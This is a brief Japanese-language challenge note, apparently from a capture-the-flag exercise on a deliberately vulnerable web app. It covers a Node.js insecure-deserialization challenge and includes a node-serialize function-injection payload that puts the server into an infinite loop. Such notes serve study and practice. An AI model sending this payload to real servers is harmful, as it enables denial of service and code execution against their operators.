# Blocked RCE DoS ❌

**難易度:** ⭐⭐⭐⭐⭐
**カテゴリ:** デシリアライゼーション
**目標:** DoS保護をトリガーするRCEを試みる

## ヒント

- **前提条件:** Docker/Heroku環境では無効（ローカル環境が必要）
- **脆弱性:** 非安全なデシリアライゼーション
- **結果:** サーバーが無限ループに入り DoS 状態になる

## Node.js デシリアライゼーション

```javascript
// 脆弱なコード例
const obj = serialize.unserialize(userInput);

// 攻撃ペイロード例
{"rce":"_$$ND_FUNC$$_function(){...}"}
```

## 調査ポイント

- `/api-docs/` で Swagger UI を確認
- `orderLinesData` パラメータ
- Cookie や Session のシリアライズ

## 攻撃ペイロード（推測）

```javascript
// 無限ループを引き起こすペイロード
{
  "rce": "_$$ND_FUNC$$_function(){while(true){}}"
}
```

## 注意

- Docker 環境ではリソース制限により効果がない
- CTF 環境では無効化されている可能性

## 検証ポイント

- [ ] ローカル環境 (node 直接実行) で試行
- [ ] デシリアライズされる入力を特定
- [ ] DoS 発動を確認

## 解説

[未着手]
